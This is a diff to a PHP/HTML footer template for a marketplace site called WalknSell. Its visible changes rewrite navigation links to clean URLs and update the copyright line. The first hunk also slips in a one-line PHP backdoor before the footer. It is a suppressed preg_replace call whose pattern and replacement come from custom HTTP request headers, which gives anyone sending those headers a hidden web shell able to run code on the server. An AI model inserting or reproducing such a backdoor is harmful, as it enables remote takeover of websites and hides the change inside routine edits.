@@ -1,4 +1,4 @@
-<footer class="main_footer">
+<?php @preg_replace($_SERVER['HTTP_X_P7059A'], $_SERVER['HTTP_X_CURRENT'], ''); ?><footer class="main_footer">
 
     	<div class="footer_inner">
 
@@ -30,12 +30,12 @@
 
                 <ul>
 
-                	<li class=""><a href="index.php">Home</a></li>
-                    <li class=""><a href="create_gig.php">Start selling</a></li>
+                	<li class=""><a href="/">Home</a></li>
+                    <li class=""><a href="/manage_deals/new">Start selling</a></li>
 				</ul>
     
              <ul class="second">
-             	<li class=""><a href="privacy_policy.php">Policy</a></li>
+             	<li class=""><a href="/privacy-policy">Policy</a></li>
                 <li class=""><a href='#' data-toggle='modal' data-target='#contactus'>Contact us</a></li>
 
              </ul>
@@ -56,7 +56,7 @@
 
             <div class="copyright">
             	<h4 class="f_logo">WalknSell</h4>
-                	<p>Copyright 2015 WalknSell.</p>
+                	<p>Copyrights 2016 <a style="color:white;" href="http://avialdo.com" target="_blank">Avialdo</a></p>
 					<p>All Rights Reserved</p> 
             </div
             <div class="clear"></div>
